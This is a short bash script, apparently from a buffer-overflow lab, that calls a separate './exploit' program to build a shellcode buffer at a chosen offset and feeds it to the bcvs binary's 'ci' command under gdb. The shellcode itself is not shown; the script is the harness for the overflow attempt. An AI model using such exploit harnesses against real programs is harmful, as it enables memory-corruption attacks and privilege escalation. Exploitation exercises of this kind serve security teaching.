#!/bin/bash

OFFSET=0
if [[ $# -eq 1 ]]; then
  OFFSET=$1
fi
echo "Createing shellcode buffer with offset $OFFSET"
export EGG=`./exploit $OFFSET`
gdb --args /opt/bcvs/bcvs ci $EGG
